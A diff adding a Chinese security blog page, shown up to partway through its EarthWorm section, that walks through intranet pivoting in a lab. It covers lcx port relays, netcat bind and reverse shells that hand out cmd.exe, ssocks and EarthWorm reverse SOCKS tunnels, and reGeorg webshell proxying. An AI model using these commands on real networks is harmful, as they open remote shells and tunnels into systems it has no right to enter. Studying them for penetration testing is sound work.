@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。  0x01 正向和反向代理正向代理中，proxy和client同属一个LAN，对server透明； 反向代理中，proxy和server同属一个LAN，对client透明。 实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。 正向代理(Forw">
+<meta name="keywords" content="端口转发,内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网端口转发及穿透">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;experience&#x2F;network-port-forwarding-and-penetration.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。  0x01 正向和反向代理正向代理中，proxy和client同属一个LAN，对server透明； 反向代理中，proxy和server同属一个LAN，对client透明。 实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。 正向代理(Forw">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-1.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-17.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-19.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-20.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-21.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-22.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-23.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-24.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-25.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-26.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-27.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-28.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-29.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-30.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-31.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-32.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-33.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-34.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-35.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-36.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-37.png">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;port-forwarding-1.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网端口转发及穿透</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/programing/webeye.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/penetration/nsa-eternalblue-smb-remote-overflow-replication.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&text=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&is_video=false&description=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网端口转发及穿透&body=Check out this article: http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&name=内网端口转发及穿透&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-正向和反向代理"><span class="toc-number">1.</span> <span class="toc-text">0x01 正向和反向代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#正向代理-Forward-Proxy"><span class="toc-number">1.1.</span> <span class="toc-text">正向代理(Forward Proxy)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反向代理（reverse-proxy）"><span class="toc-number">1.2.</span> <span class="toc-text">反向代理（reverse proxy）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单区分"><span class="toc-number">1.3.</span> <span class="toc-text">简单区分</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-lcx转发"><span class="toc-number">2.</span> <span class="toc-text">0x02 lcx转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-nc反弹"><span class="toc-number">3.</span> <span class="toc-text">0x03 nc反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#正向连接"><span class="toc-number">3.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反向连接"><span class="toc-number">3.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-socks代理工具"><span class="toc-number">4.</span> <span class="toc-text">0x04 socks代理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-0-ssocks"><span class="toc-number">5.</span> <span class="toc-text">0x04.0 ssocks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-1-reGeorg-Proxychains代理"><span class="toc-number">5.1.</span> <span class="toc-text">0x04.1 reGeorg+Proxychains代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-ew穿透"><span class="toc-number">5.2.</span> <span class="toc-text">0x04.2 ew穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x04-2-1-正向SOCKS5服务器"><span class="toc-number">5.2.1.</span> <span class="toc-text">0x04.2.1 正向SOCKS5服务器</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-2-反弹SOCKS5服务器"><span class="toc-number">5.3.</span> <span class="toc-text">0x04.2.2 反弹SOCKS5服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-3-二级网络环境（一）"><span class="toc-number">5.4.</span> <span class="toc-text">0x04.2.3 二级网络环境（一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-4-二级网络环境（二）"><span class="toc-number">5.5.</span> <span class="toc-text">0x04.2.4 二级网络环境（二）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-ssh隧道代理转发"><span class="toc-number">6.</span> <span class="toc-text">0x05 ssh隧道代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-1-ssh本地转发"><span class="toc-number">6.1.</span> <span class="toc-text">0x05.1 ssh本地转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-2-ssh远程转发"><span class="toc-number">6.2.</span> <span class="toc-text">0x05.2 ssh远程转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-2-ssh动态转发socks代理"><span class="toc-number">6.3.</span> <span class="toc-text">0x05.2 ssh动态转发socks代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-内网穿透平台"><span class="toc-number">7.</span> <span class="toc-text">0x06 内网穿透平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-参考"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网端口转发及穿透
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-04-28T03:46:00.000Z" itemprop="datePublished">2017-04-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/experience/">experience</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>, <a class="tag-link" href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" rel="tag">端口转发</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-1.jpg" alt=""></p>
+<h3 id="0x01-正向和反向代理"><a href="#0x01-正向和反向代理" class="headerlink" title="0x01 正向和反向代理"></a>0x01 正向和反向代理</h3><p>正向代理中，proxy和client同属一个LAN，对server透明； 反向代理中，proxy和server同属一个LAN，对client透明。 实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。</p>
+<h4 id="正向代理-Forward-Proxy"><a href="#正向代理-Forward-Proxy" class="headerlink" title="正向代理(Forward Proxy)"></a>正向代理(Forward Proxy)</h4><pre><code>Lhost－－》proxy－－》Rhost</code></pre><p>Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。</p>
+<h4 id="反向代理（reverse-proxy）"><a href="#反向代理（reverse-proxy）" class="headerlink" title="反向代理（reverse proxy）"></a>反向代理（reverse proxy）</h4><pre><code>Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost</code></pre><p>和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透</p>
+<h4 id="简单区分"><a href="#简单区分" class="headerlink" title="简单区分"></a>简单区分</h4><p>正向代理代理的是客户端，反向代理代理的是服务端，正向代理是我们自己(Lhost)戴套(proxy)插进去，反向代理是她(Rhost)主动通过上位(proxy)坐上来(Lhost)。</p>
+<h3 id="0x02-lcx转发"><a href="#0x02-lcx转发" class="headerlink" title="0x02 lcx转发"></a>0x02 lcx转发</h3><p>内网IP：192.168.153.138<br>公网ip：192.168.153.140<br>由于是本地实验，我这里将138的防火墙打开，当作内网环境，140防火墙关闭，充当公网ip，所以正常情况下138能访问140，而140不能直接访问138。这是两台机器互相ping的结果。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-2.png" alt=""></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-3.png" alt=""></p>
+<p>1.内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p>
+<pre><code>lcx.exe –slave 192.168.153.140 4444 192.168.153.138 3389</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-4.png" alt=""></p>
+<p>将内网(192.168.153.138)的3389端口转发到公网(192.168.153.138)的4444端口<br>2.公网(192.168.153.138)执行：lcx -listen 4444 5555</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-5.png" alt=""></p>
+<p>监听公网4444端口请求，并将4444的请求传送给5555端口。<br>此时已经把内网的3389端口转发到了公网的5555端口。可以通过127.0.0.1:5555连接到内网的远程桌面。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-6.png" alt=""></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-7.png" alt=""></p>
+<h3 id="0x03-nc反弹"><a href="#0x03-nc反弹" class="headerlink" title="0x03 nc反弹"></a>0x03 nc反弹</h3><h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><p>在内网执行</p>
+<pre><code>nc -l -p 5555 -t -e cmd.exe</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-8.png" alt=""></p>
+<p><code>-t</code>是通过telne模式执行 cmd.exe 程序，可以省略。<br>在公网执行</p>
+<pre><code>nc -nvv 192.168.153.138 5555</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-9.png" alt=""></p>
+<h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><p>在公网监听<code>nc -lp 5555</code></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-10.png" alt=""></p>
+<p>在内网机器反弹<code>nc -t -e cmd 192.168.153.140 5555</code></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-11.png" alt=""></p>
+<h3 id="0x04-socks代理工具"><a href="#0x04-socks代理工具" class="headerlink" title="0x04 socks代理工具"></a>0x04 socks代理工具</h3><p>常见的socks代理工具介绍如下<br>1.Earthworm     工具网址：<a href="http://rootkiter.com/EarthWorm" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm</a> </p>
+<p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。</p>
+<p>目前已经有了最新版Termite，工具网址：<a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a> </p>
+<p>2.reGeorg         工具网址：<a href="https://github.com/NoneNotNull/reGeorg" target="_blank" rel="noopener">https://github.com/NoneNotNull/reGeorg</a> </p>
+<p>reGeorg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。</p>
+<p>3.sSocks          工具网址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a> </p>
+<p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.14。</p>
+<p>4.SocksCap64     工具网址：<a href="http://www.sockscap64.com" target="_blank" rel="noopener">http://www.sockscap64.com</a> (需翻墙)</p>
+<p>SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。</p>
+<p>5.proxychains     工具网址：<a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a></p>
+<p>Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通過代理上网，允許TCP和DNS通過代理隧道，支持HTTP、SOCKS4、SOCKS5類型的代理服务器，支持proxy chain，即可配置多个代理，同一個proxy chain可使用不同类型的代理服务器</p>
+<h3 id="0x04-0-ssocks"><a href="#0x04-0-ssocks" class="headerlink" title="0x04.0 ssocks"></a>0x04.0 ssocks</h3><p>linux版<br>安装</p>
+<pre><code>wget https://phoenixnap.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz
+tar -zxf ssocks-0.0.14.tar.gz
+cd ssocks-0.0.14
+./configure &amp;&amp; make
+cd src</code></pre><p>先在本地机器上执行,一般都是你自己的vps:</p>
+<pre><code>./rcsocks -l 1080 -p 1234 -v</code></pre><p>目标机器上执行,实际渗透情况中加上 -b后台运行</p>
+<pre><code>./rssocks -s  192.168.1.100(vps的ip):1234 -v</code></pre><p>然后通过本地各种socks代理工具配置代理即可,socks5 192.168.1.100 1080</p>
+<p><a href="https://ci.appveyor.com/api/buildjobs/6oo804blxk09ld1q/artifacts/ssocks-win32-0.0.14.58.zip" target="_blank" rel="noopener">win版本</a>同理</p>
+<h4 id="0x04-1-reGeorg-Proxychains代理"><a href="#0x04-1-reGeorg-Proxychains代理" class="headerlink" title="0x04.1 reGeorg+Proxychains代理"></a>0x04.1 reGeorg+Proxychains代理</h4><p>上传reGeorg的tunnel.jsp到服务器。访问链接，并转发到本地端口。</p>
+<pre><code>python reGeorgSocksProxy.py -p 1080 -u http://192.168.153.137/tunnel.jsp</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-12.png" alt=""></p>
+<p>使用设置proxychains的代理端口，进行访问，一般配合nmap和metasploit进行后续内网渗透。ps：proxychains不支持udp和icmp协议，所以使用nmap要加上<code>-sT -Pn</code>即使用tcp协议且不使用icmp协议。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-13.png" alt=""></p>
+<h4 id="0x04-2-ew穿透"><a href="#0x04-2-ew穿透" class="headerlink" title="0x04.2 ew穿透"></a>0x04.2 ew穿透</h4><p>该工具借用了 ssocks 和 lcx.exe 的操作逻辑，并进行更多的功能强化。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-14.png" alt=""></p>
+<p>说明</p>
+<pre><code>目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:
+
+    ssocksd   rcsocks   rssocks   
+    lcx_slave lcx_tran  lcx_listen
+
+    其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。
+
+    其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。
+
+lcx 类别管道：
+
+    lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
+    lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
+    lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
+
+    通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。
+
+    下面是一个三级跳的本地测试例子。。。
+    ./ew -s rcsocks -l 1080 -e 8888
+    ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+    ./ew -s lcx_listen -l 9999 -e 7777
+    ./ew -s rssocks -d 127.0.0.1 -e 7777
+
+    数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</code></pre><h5 id="0x04-2-1-正向SOCKS5服务器"><a href="#0x04-2-1-正向SOCKS5服务器" class="headerlink" title="0x04.2.1 正向SOCKS5服务器"></a>0x04.2.1 正向SOCKS5服务器</h5><p>当目标网络边界存在公网IP且可任意开监听端口</p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-15.png" alt=""></p>
+<p>上述命令是在该机器（192.168.153.140）开启一个8888的正向连接端口。然后其它主机可通过设置代理为 192.168.153.140:8888添加这个代理。这里使用的是proxychains</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-16.png" alt=""></p>
+<h4 id="0x04-2-2-反弹SOCKS5服务器"><a href="#0x04-2-2-反弹SOCKS5服务器" class="headerlink" title="0x04.2.2 反弹SOCKS5服务器"></a>0x04.2.2 反弹SOCKS5服务器</h4><p>当目标网络边界不存在公网IP，通过反弹方式创建socks代理。<br>先在一台具有公网 ip 的主机A上运行以下命令</p>
+<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-17.png" alt=""></p>
+<p>意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给8888端口</p>
+<p>在目标主机B上启动SOCKS5服务 并反弹到公网主机的8888端口</p>
+<pre><code>ew_for_Win.exe -s rssocks -d 192.168.153.129 -e 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-18.png" alt=""></p>
+<p>本地主机（192.168.153.129）然后通过添加公网192.168.153.129:1080这个代理,来访问内网机器（192.168.153.129）<br>当然如果本地主机如果是公网ip，就可以把在公网执行的步骤放在本地执行即可。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-19.png" alt=""></p>
+<h4 id="0x04-2-3-二级网络环境（一）"><a href="#0x04-2-3-二级网络环境（一）" class="headerlink" title="0x04.2.3 二级网络环境（一）"></a>0x04.2.3 二级网络环境（一）</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机配有2块网卡，一块10.129.72.168连通外网，一块192.168.153.140只能连接内网B主机，无法访问内网其它资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-20.png" alt=""></p>
+<p>先上传ew到B主机，利用ssocksd方式启动8888端口的SOCKS代理，命令如下</p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 8888</code></pre><p>然后在A主机执行</p>
+<pre><code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153.138 -g 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-21.png" alt=""></p>
+<p>含义是将1080端口收到的代理请求转交给B主机（192.168.153.138）的8888端口<br>然后My pc就可以通过A的外网代理10.129.72.168:1080访问B。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-22.png" alt=""></p>
